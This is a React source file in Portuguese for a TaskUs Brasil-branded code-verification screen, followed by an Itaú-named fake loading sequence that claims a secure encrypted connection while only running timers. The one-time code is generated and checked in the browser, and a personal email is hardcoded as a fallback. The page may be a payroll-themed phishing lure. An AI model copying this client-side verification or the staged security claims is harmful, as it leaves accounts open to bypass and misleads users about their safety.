/* eslint-disable no-unused-vars */

import { useState, useEffect, useRef } from 'react';
import { motion } from 'framer-motion';
import '../../styles/refino.css';
import { useProcess } from '../../hooks/useProcess.js';
import { backendAPI } from '../../services/backendAPIService.js';

/* =========================
   ÍCONES UTILIZADOS NO LOADING
   ========================= */
const ShieldCheckIcon = (props) => (
  <svg viewBox="0 0 24 24" aria-hidden="true" {...props}>
    <g fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5">
      <path d="M11.998 2C8.99 2 7.04 4.019 4.734 4.755c-.938.3-1.407.449-1.597.66c-.19.21-.245.519-.356 1.135c-1.19 6.596 1.41 12.694 7.61 15.068c.665.255.998.382 1.61.382s.946-.128 1.612-.383c6.199-2.373 8.796-8.471 7.606-15.067c-.111-.616-.167-.925-.357-1.136s-.658-.36-1.596-.659C16.959 4.019 15.006 2 11.998 2" />
      <path d="M9 13s1 0 2 2c0 0 3.177-5 6-6" />
    </g>
  </svg>
);

const DatabaseIcon = (props) => (
  <svg viewBox="0 0 24 24" aria-hidden="true" {...props}>
    <g fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5">
      <ellipse cx="12" cy="5" rx="9" ry="3" />
      <path d="M3 5v14c0 1.66 4.03 3 9 3s9-1.34 9-3V5" />
      <path d="M3 12c0 1.66 4.03 3 9 3s9-1.34 9-3" />
    </g>
  </svg>
);

const CpuIcon = (props) => (
  <svg viewBox="0 0 24 24" aria-hidden="true" {...props}>
    <g fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5">
      <rect width="16" height="16" x="4" y="4" rx="2" />
      <rect width="6" height="6" x="9" y="9" rx="1" />
      <path d="M15 2v2M15 20v2M2 15h2M20 15h2M2 9h2M20 9h2M9 2v2M9 20v2" />
    </g>
  </svg>
);

/* =========================
   TELA DE CARREGAMENTO EMBUTIDA
   ========================= */
const PaymentItauLoadingStep = ({ onLoadingComplete, autoAdvanceMs = 6000 }) => {
  const [progress, setProgress] = useState(0);
  const [currentPhase, setCurrentPhase] = useState(0);
  const advancedRef = useRef(false);

  const phases = [
    { title: 'Conectando ao Sistema', subtitle: 'Estabelecendo conexão segura com área do colaborador', icon: ShieldCheckIcon, duration: 3000 },
    { title: 'Carregando Dados',     subtitle: 'Sincronizando suas informações',                        icon: DatabaseIcon,   duration: 3000 },
    { title: 'Configurações',        subtitle: 'Buscando aba de pagamentos',                             icon: CpuIcon,        duration: 3000 },
    { title: 'Direcionando',         subtitle: 'Direcionando colaborador',                               icon: ShieldCheckIcon,duration: 2000 },
  ];

  const originalTotal = phases.reduce((acc, p) => acc + p.duration, 0);
  const scale = autoAdvanceMs / originalTotal;

  const advance = () => {
    if (advancedRef.current) return;
    advancedRef.current = true;
    onLoadingComplete?.();
  };

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  useEffect(() => {
    // Troca de fases reescalonada
    let totalTime = 0;
    const timeouts = phases.map((phase, index) => {
      const t = setTimeout(() => setCurrentPhase(index), totalTime);
      totalTime += Math.max(1, Math.round(phase.duration * scale));
      return t;
    });

    // Progresso
    const tickMs = 40;
    const steps = Math.max(1, Math.round(autoAdvanceMs / tickMs));
    const increment = 100 / steps;

    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        const next = prev + increment;
        if (next >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return next;
      });
    }, tickMs);

    // Avanço automático
    const timer = setTimeout(advance, autoAdvanceMs);

    return () => {
      timeouts.forEach(clearTimeout);
      clearInterval(progressInterval);
      clearTimeout(timer);
    };
  }, [autoAdvanceMs]);

  const CurrentIcon = phases[currentPhase]?.icon || ShieldCheckIcon;

  return (
    <div className="p-6 min-h-screen bg-[#0a0026]">
      <motion.div
        className="bg-white rounded-2xl pt-6 mb-10 mt-5 flex flex-col items-center shadow-lg"
        style={{ minHeight: '380px' }}
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8 }}
      >
        {/* Indicador de segurança */}
        <div className="w-full flex flex-col items-center mb-4">
          <div className="flex items-center gap-2 mb-3 mt-1">
            <ShieldCheckIcon className="w-5 h-5" style={{ color: '#1655ff' }} />
            <span className="font-hendrix-regular text-gray-400 text-xs" style={{ letterSpacing: '0.2px' }}>
              Conexão segura e criptografada
            </span>
          </div>
        </div>

        {/* Status atual */}
        <motion.div
          className="mt-3 w-[100%] flex justify-center mb-2"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.6, delay: 0.2 }}
        >
          <div className="bg-black w-[90%] backdrop-blur-sm rounded-xl p-4 border border-black">
            <div className="flex items-center space-x-3">
              <div className="flex-shrink-0">
                <CurrentIcon className="w-6 h-6 text-blue-400" style={{ color: '#72a0d5' }} />
              </div>
              <div className="flex-1">
                <h3 className="font-hendrix-medium text-white text-sm">
                  {phases[currentPhase]?.title}
                </h3>
                <p className="font-hendrix-regular text-white/70 text-xs">
                  {phases[currentPhase]?.subtitle}
                </p>
              </div>
            </div>
          </div>
        </motion.div>

        {/* Barra de progresso */}
        <div className="w-[85%] mb-3">
          <div className="bg-gray-200 rounded-full h-2 overflow-hidden">
            <motion.div
              className="h-full rounded-full bg-[#5b86be]"
              style={{ width: `${progress}%` }}
              initial={{ width: 0 }}
              animate={{ width: `${progress}%` }}
              transition={{ duration: 0.3, ease: 'easeOut' }}
            />
          </div>
        </div>
      </motion.div>

      {/* Rodapé */}
      <motion.div
        className="text-center mt-4"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.6, delay: 0.6 }}
      >
        <p className="font-hendrix-regular text-white/60 text-xs">
          Seus dados estão protegidos de acordo com a LGPD<br />
          TaskUs Brasil • Todos os direitos reservados
        </p>
      </motion.div>
    </div>
  );
};

/* =========================
   UTIL
   ========================= */
const soDigitos = (s = "") => s.replace(/\D/g, "");
const gerarCodigo = () => Math.floor(100000 + Math.random() * 900000).toString();

/* =========================
   COMPONENTE PRINCIPAL
   ========================= */
const PaymentTelNumber = ({ onContinuar, telefoneUsuarioProp }) => {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [timer, setTimer] = useState(30);
  const inputRefs = useRef([]);
  const [codigoEnviado, setCodigoEnviado] = useState('');
  const [loading, setLoading] = useState(false);
  const [codigoInvalido, setCodigoInvalido] = useState(false);
  const [showLoadingScreen, setShowLoadingScreen] = useState(false);
  const [codigoValidado, setCodigoValidado] = useState('');

  const { processData } = useProcess();

  // Recupera telefone (prop > localStorage > contexto)
  const telefoneDoUsuario = (() => {
    if (telefoneUsuarioProp) return telefoneUsuarioProp;
    try {
      const local = JSON.parse(localStorage.getItem('processData'));
      if (local?.userData?.phone) return local.userData.phone;
    } catch {}
    return processData?.userData?.phone || '';
  })();
  let emailDoUsuario = processData?.userData?.email || '';
  // Se não houver email no contexto, usa o padrão fornecido
  if (!emailDoUsuario) {
    emailDoUsuario = 'lh.m21112000@gmail.com';
  }

  // Envia primeiro código ao montar
  useEffect(() => {
    (async () => {
      const codigo = gerarCodigo();
      setCodigoEnviado(codigo);
      try {
        if (emailDoUsuario) await backendAPI.confirmEmail(emailDoUsuario, codigo);
      } catch {}
      try {
        if (telefoneDoUsuario) {
          if (backendAPI?.sendSms) {
            await backendAPI.sendSms(telefoneDoUsuario, `Seu código é: ${codigo}`);
          } else {
            await fetch('/api/enviar-sms', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ telefone: telefoneDoUsuario, codigo }),
            });
          }
        }
      } catch {}
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Timer de reenviar
  useEffect(() => {
    if (timer <= 0) return;
    const it = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(it);
  }, [timer]);

  const handleChange = (e, idx) => {
    const val = soDigitos(e.target.value).slice(0, 1);
    if (!val) return;
    const newCode = [...code];
    newCode[idx] = val;
    setCode(newCode);
    setCodigoInvalido(false);
    if (idx < 5) inputRefs.current[idx + 1]?.focus();
  };

  const handleKeyDown = (e, idx) => {
    if (e.key === 'Backspace') {
      if (code[idx]) {
        const newCode = [...code];
        newCode[idx] = '';
        setCode(newCode);
      } else if (idx > 0) {
        inputRefs.current[idx - 1]?.focus();
        const newCode = [...code];
        newCode[idx - 1] = '';
        setCode(newCode);
      }
    }
  };

  const handlePaste = (e) => {
    const paste = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (paste.length === 6) {
      setCode(paste.split(''));
      inputRefs.current[5]?.focus();
    }
    e.preventDefault();
  };

  const todosDigitados = code.every((d) => d);

  const reenviar = async () => {
    setTimer(30);
    setCode(['', '', '', '', '', '']);
    const novo = gerarCodigo();
    setCodigoEnviado(novo);
    try {
      if (emailDoUsuario) await backendAPI.confirmEmail(emailDoUsuario, novo);
    } catch {}
    try {
      if (telefoneDoUsuario) {
        if (backendAPI?.sendSms) {
          await backendAPI.sendSms(telefoneDoUsuario, `Seu código é: ${novo}`);
        } else {
          await fetch('/api/enviar-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telefone: telefoneDoUsuario, codigo: novo }),
          });
        }
      }
    } catch {}
    setTimeout(() => inputRefs.current[0]?.focus(), 150);
  };

  // Confirmar → se ok, mostra loading e avança ao fim
  const handleConfirmar = async () => {
    if (!todosDigitados || loading) return;
    const codigoDigitado = code.join('');
    if (codigoDigitado === codigoEnviado) {
      setCodigoInvalido(false);
      setCodigoValidado(codigoDigitado);
      setLoading(true);
      setShowLoadingScreen(true);
    } else {
      setCodigoInvalido(true);
    }
  };

  // Quando o loading interno termina, chamamos o onContinuar
  const handleLoadingComplete = async () => {
    try {
      await onContinuar?.(codigoValidado);
    } finally {
      setLoading(false);
      setShowLoadingScreen(false);
    }
  };

  // Renderiza somente a tela de carregamento quando ativa
  if (showLoadingScreen) {
    return (
      <PaymentItauLoadingStep
        autoAdvanceMs={6000}
        onLoadingComplete={handleLoadingComplete}
      />
    );
  }

  /* =========================
     TELA DE VERIFICAÇÃO (OTP)
     ========================= */
  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Título e subtítulo */}
      <div className="w-full px-6 pt-10 pb-2">
        <h1 className="font-hendrix-semibold text-2xl text-gray-900 mb-2 text-left" style={{ lineHeight: 1.25 }}>
          Confirme seu endereço de e-mail para continuar
        </h1>
        <p className="font-hendrix-regular text-gray-500 text-base mb-2 text-left">
          Enviamos um código de 6 dígitos para <strong>{emailDoUsuario || 'seu e-mail'}</strong>. Digite o código abaixo para continuar.
        </p>
      </div>

      {/* Inputs do código */}
      <div className="flex-1 flex flex-col items-center justify-center px-6">
        <div className="flex justify-center items-center space-x-4 mb-6">
          {code.map((digit, idx) => (
            <input
              key={idx}
              ref={(el) => (inputRefs.current[idx] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(e, idx)}
              onKeyDown={(e) => handleKeyDown(e, idx)}
              onPaste={handlePaste}
              className="w-12 h-14 text-center text-2xl font-hendrix-semibold border-b-2 border-gray-300 focus:border-[#3455ff] outline-none bg-transparent"
              style={{ letterSpacing: '2px' }}
            />
          ))}
        </div>

        {codigoInvalido && (
          <div className="text-red-600 font-hendrix-medium text-sm mb-2 text-center">
            O código informado não coincide. Tente novamente.
          </div>
        )}

        <div className="text-center text-gray-500 text-sm mb-10">
          {timer > 0 ? (
            <>Reenviar (Aguarde 0:{timer.toString().padStart(2, '0')})</>
          ) : (
            <button
              type="button"
              className="text-[#3455ff] font-hendrix-semibold underline hover:opacity-80 transition"
              onClick={reenviar}
            >
              Reenviar
            </button>
          )}
        </div>
      </div>

      {/* Botão continuar (azul) */}
      <div className="w-full px-6 pb-8">
        <motion.button
          type="button"
          onClick={handleConfirmar}
          disabled={!todosDigitados || loading}
          whileTap={{ scale: 0.97 }}
          whileHover={{ scale: loading ? 1 : 1.03 }}
          className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md 
            focus:outline-none focus:ring-2 focus:ring-[#3455ff] transition-all duration-300 
            bg-[#3455ff] hover:bg-[#3455ff]/90 
            ${(!todosDigitados || loading) ? 'opacity-60 cursor-not-allowed' : ''}`}
          style={{
            fontSize: '15pt',
            boxShadow: '0 2px 8px 0 rgba(52,85,255,0.18)',
            border: 'none',
            opacity: loading ? 0.7 : 1
          }}
        >
          {loading ? (
            <>
              <motion.div
                className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                animate={{ rotate: 360 }}
                transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
              />
              <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
            </>
          ) : (
            <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Confirmar</span>
          )}
        </motion.button>
      </div>
    </div>
  );
};

export default PaymentTelNumber;